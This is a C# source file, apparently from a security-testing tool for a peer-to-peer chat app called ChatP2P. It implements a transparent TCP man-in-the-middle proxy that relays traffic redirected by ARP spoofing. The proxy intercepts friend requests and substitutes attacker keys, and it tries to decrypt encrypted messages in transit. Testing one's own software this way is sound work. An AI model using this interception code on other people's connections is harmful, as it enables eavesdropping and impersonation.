using System;
using System.Net;
using System.Net.Sockets;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Linq;
using ChatP2P.SecurityTester.Models;
using ChatP2P.SecurityTester.Crypto;
using ChatP2P.SecurityTester.Core;

namespace ChatP2P.SecurityTester.Network
{
    /// <summary>
    /// 🕷️ Proxy TCP transparent pour MITM réel - Architecture simplifiée avec Windows Portproxy
    /// </summary>
    public class TCPProxy_Fixed
    {
        private TcpListener? _proxyListener;
        private bool _isRunning = false;
        private readonly KeySubstitutionAttack _keyAttack;
        private CancellationTokenSource? _cancellationToken;

        public event Action<string>? LogMessage;
        public event Action<AttackResult>? PacketModified;

        public TCPProxy_Fixed(KeySubstitutionAttack keyAttack)
        {
            _keyAttack = keyAttack;
        }

        /// <summary>
        /// 🚀 Démarre proxy TCP avec architecture transparente simplifiée
        /// </summary>
        public async Task<bool> StartProxy(int listenPort, string targetHost, int targetPort, IPAddress? listenAddress = null)
        {
            try
            {
                // 🚨 ARCHITECTURE SIMPLIFIÉE: TOUJOURS écouter sur localhost
                var bindAddress = IPAddress.Loopback;  // 127.0.0.1 - simple et fiable
                var attackerIP = GetLocalIPAddress();

                LogMessage?.Invoke($"🔧 ARCHITECTURE TRANSPARENTE SIMPLIFIÉE:");
                LogMessage?.Invoke($"   1️⃣ Victime se connecte à relay → ARP spoof redirige vers attaquant");
                LogMessage?.Invoke($"   2️⃣ Windows Portproxy {attackerIP}:{listenPort} → localhost:{listenPort}");
                LogMessage?.Invoke($"   3️⃣ TCPProxy localhost:{listenPort} → relay {targetHost}:{targetPort}");

                _proxyListener = new TcpListener(bindAddress, listenPort);
                _proxyListener.Start();
                _isRunning = true;
                _cancellationToken = new CancellationTokenSource();

                LogMessage?.Invoke($"🕷️ TCPProxy ACTIF: {bindAddress}:{listenPort} → {targetHost}:{targetPort}");
                LogMessage?.Invoke($"📡 En attente connexions via Windows Portproxy...");

                // Accepter connexions entrantes de manière asynchrone
                _ = Task.Run(async () => await AcceptConnections(targetHost, targetPort, _cancellationToken.Token));

                await Task.Delay(100);
                LogMessage?.Invoke($"✅ Proxy opérationnel - TcpListener.LocalEndpoint = {_proxyListener.LocalEndpoint}");

                return true;
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur démarrage proxy: {ex.Message}");
                return false;
            }
        }

        private async Task AcceptConnections(string targetHost, int targetPort, CancellationToken cancellationToken)
        {
            try
            {
                while (_isRunning && !cancellationToken.IsCancellationRequested)
                {
                    try
                    {
                        var clientSocket = await _proxyListener!.AcceptTcpClientAsync();
                        LogMessage?.Invoke($"📡 CONNEXION REÇUE: {clientSocket.Client.RemoteEndPoint}");

                        // Traiter chaque connexion en parallèle
                        _ = Task.Run(async () => await HandleConnection(clientSocket, targetHost, targetPort, cancellationToken));
                    }
                    catch (Exception ex)
                    {
                        LogMessage?.Invoke($"❌ Erreur AcceptTcpClientAsync: {ex.Message}");
                        break;
                    }
                }
            }
            catch (Exception ex) when (!cancellationToken.IsCancellationRequested)
            {
                LogMessage?.Invoke($"❌ Erreur acceptation connexions: {ex.Message}");
            }
        }

        private async Task HandleConnection(TcpClient clientSocket, string targetHost, int targetPort, CancellationToken cancellationToken)
        {
            TcpClient? relaySocket = null;

            try
            {
                LogMessage?.Invoke($"🔄 Établissement tunnel: Client → [PROXY] → {targetHost}:{targetPort}");

                relaySocket = new TcpClient();
                relaySocket.ReceiveTimeout = 120000; // 2 minutes
                relaySocket.SendTimeout = 120000;
                relaySocket.ReceiveBufferSize = 1048576; // 1MB buffer
                relaySocket.SendBufferSize = 1048576;
                relaySocket.NoDelay = true;
                relaySocket.LingerState = new LingerOption(false, 0);

                await relaySocket.ConnectAsync(targetHost, targetPort);
                relaySocket.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, true);

                LogMessage?.Invoke($"✅ Tunnel établi: Client ↔ [PROXY] ↔ {targetHost}:{targetPort}");

                // Configuration client optimisée
                clientSocket.ReceiveBufferSize = 1048576;
                clientSocket.SendBufferSize = 1048576;
                clientSocket.ReceiveTimeout = 120000;
                clientSocket.SendTimeout = 120000;
                clientSocket.NoDelay = true;
                clientSocket.LingerState = new LingerOption(false, 0);
                clientSocket.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, true);

                var clientStream = clientSocket.GetStream();
                var relayStream = relaySocket.GetStream();

                // Relais bidirectionnel avec interception
                var task1 = RelayData(clientStream, relayStream, "Client→Relay", cancellationToken);
                var task2 = RelayData(relayStream, clientStream, "Relay→Client", cancellationToken);

                await Task.WhenAny(task1, task2);
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur tunnel: {ex.Message}");
            }
            finally
            {
                clientSocket?.Close();
                relaySocket?.Close();
                LogMessage?.Invoke("🔚 Tunnel fermé");
            }
        }

        private async Task RelayData(NetworkStream source, NetworkStream destination, string direction, CancellationToken cancellationToken)
        {
            try
            {
                var buffer = new byte[1048576]; // 1MB buffer
                bool isSearchConnection = false;

                while (!cancellationToken.IsCancellationRequested)
                {
                    int bytesRead = await source.ReadAsync(buffer, 0, buffer.Length, cancellationToken);
                    if (bytesRead == 0)
                    {
                        if (isSearchConnection)
                            LogMessage?.Invoke($"✅ SEARCH: Connexion fermée proprement - {direction}");
                        break;
                    }

                    var data = new byte[bytesRead];
                    Array.Copy(buffer, data, bytesRead);

                    // 🔍 Intercepter et modifier selon le contenu
                    byte[] finalData = await InterceptAndModify(data, direction);

                    await destination.WriteAsync(finalData, 0, finalData.Length, cancellationToken);
                    await destination.FlushAsync(cancellationToken);
                }
            }
            catch (Exception ex) when (!cancellationToken.IsCancellationRequested)
            {
                if (ex.Message.Contains("timeout") || ex.Message.Contains("time") ||
                    ex.Message.Contains("A connection attempt failed"))
                {
                    LogMessage?.Invoke($"⏱️ CONNEXION FERMÉE: {direction} - Normal pour search one-shot");
                    return;
                }

                LogMessage?.Invoke($"❌ Erreur relais {direction}: {ex.Message}");
            }
        }

        /// <summary>
        /// 🎯 Intercepte et modifie les packets ChatP2P en temps réel
        /// </summary>
        private async Task<byte[]> InterceptAndModify(byte[] data, string direction)
        {
            try
            {
                string content;
                try
                {
                    content = Encoding.UTF8.GetString(data);
                }
                catch
                {
                    return data; // Si décodage UTF8 échoue, relayer tel quel
                }

                // 🔍 SEARCH REQUEST: Relais transparent (pas de modification)
                if (content.Contains("search_peers") || content.Contains("find_peer"))
                {
                    LogMessage?.Invoke($"🔍 SEARCH REQUEST: {direction} - relais transparent");
                    return data;
                }

                // 🔍 SEARCH RESPONSE: Relais transparent
                if (content.Contains("\"peers\":") && direction == "Relay→Client")
                {
                    LogMessage?.Invoke($"🔍 SEARCH RESPONSE: {direction} - peers trouvés");
                    return data;
                }

                // 🎯 FRIEND REQUEST: INTERCEPTION ET SUBSTITUTION
                if ((content.Contains("FRIEND_REQ:") || content.Contains("FRIEND_REQ_DUAL:") ||
                     content.Contains("SECURE_FRIEND_REQUEST")) && direction == "Client→Relay")
                {
                    LogMessage?.Invoke($"🎯 FRIEND REQUEST INTERCEPTÉE!");
                    LogMessage?.Invoke($"   Direction: {direction}");
                    LogMessage?.Invoke($"   Contenu: {content.Substring(0, Math.Min(100, content.Length))}...");

                    // 🕷️ SUBSTITUTION CLÉS EN TEMPS RÉEL
                    var attackResult = await _keyAttack.AttemptFriendRequestSubstitution(content);

                    if (attackResult.Success && !string.IsNullOrEmpty(attackResult.Details))
                    {
                        LogMessage?.Invoke("✅ SUBSTITUTION RÉUSSIE - Clés attaquant injectées!");

                        PacketModified?.Invoke(new AttackResult
                        {
                            Success = true,
                            AttackType = "REAL_TIME_KEY_SUBSTITUTION",
                            Description = "Friend request modifiée en temps réel",
                            Details = $"Original: {content.Length} bytes → Modifié: {attackResult.Details.Length} bytes"
                        });

                        return Encoding.UTF8.GetBytes(attackResult.Details);
                    }
                }

                // 🔓 MESSAGE CHIFFRÉ: DÉCHIFFREMENT
                if (content.Contains("[PQC_ENCRYPTED]") && direction == "Client→Relay")
                {
                    LogMessage?.Invoke($"🔒 MESSAGE CHIFFRÉ INTERCEPTÉ!");

                    var decryptResult = await _keyAttack.AttemptMessageDecryption(content);
                    if (decryptResult.Success && !string.IsNullOrEmpty(decryptResult.Details))
                    {
                        LogMessage?.Invoke("🔓 DÉCHIFFREMENT RÉUSSI!");
                        LogMessage?.Invoke($"💬 Contenu: \"{decryptResult.Details}\"");

                        PacketModified?.Invoke(new AttackResult
                        {
                            Success = true,
                            AttackType = "REAL_TIME_MESSAGE_DECRYPTION",
                            Description = "Message chiffré déchiffré en temps réel",
                            Details = $"Message: \"{decryptResult.Details}\""
                        });
                    }
                }

                return data; // Pas de modification
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur modification packet: {ex.Message}");
                return data;
            }
        }

        public void StopProxy()
        {
            try
            {
                _isRunning = false;
                _cancellationToken?.Cancel();
                _proxyListener?.Stop();
                LogMessage?.Invoke("⏹️ Proxy TCP arrêté");
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur arrêt proxy: {ex.Message}");
            }
        }

        public bool IsRunning => _isRunning;

        private string GetLocalIPAddress()
        {
            try
            {
                var host = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());
                var localIP = host.AddressList
                    .Where(ip => ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    .Where(ip => !System.Net.IPAddress.IsLoopback(ip))
                    .FirstOrDefault();

                return localIP?.ToString() ?? "localhost";
            }
            catch
            {
                return "localhost";
            }
        }
    }
}